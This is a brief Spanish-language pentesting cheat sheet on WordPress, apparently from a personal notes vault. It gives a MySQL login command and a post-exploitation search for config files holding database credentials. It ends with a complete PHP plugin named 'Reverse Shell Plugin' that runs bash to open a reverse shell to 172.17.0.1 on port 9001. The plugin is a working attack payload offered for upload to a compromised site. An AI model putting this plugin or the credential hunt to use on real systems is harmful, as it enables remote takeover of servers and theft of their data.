----------------------------
- Tags  #cms #web #gestor #github #wordpress 
- ------------------------

# Definicion

> WordPress es un sistema de gestión de contenidos web (CMS o content management system), que en pocas palabras es un sistema para publicar contenido en la web de forma sencilla. Tan común es ya, que es el líder absoluto a nivel mundial para la creación de webs desde hace muchísimos años

Leer mas [click aqui](https://es.wikipedia.org/wiki/WordPress)

- Conexion *MySQL*
```bash
mysql <IP_Target> -u <user> -p
```

--------------------

- Busqueda *PostExplotacion* de archivo de *Configuracion* con credenciales validas de acceso a la BD
```bash
find / -name *config*.php 2>/dev/null
```

# Reconocimiento

Una de las herramientas mas comunes y efectivas para aplicar reconocimiento de es CMS es [[Wpscan]]

## WordPress RevShell ZIP
```php
<?php
/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author URI: http://www.sevenlayers.com
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/9001 0>&1'");
```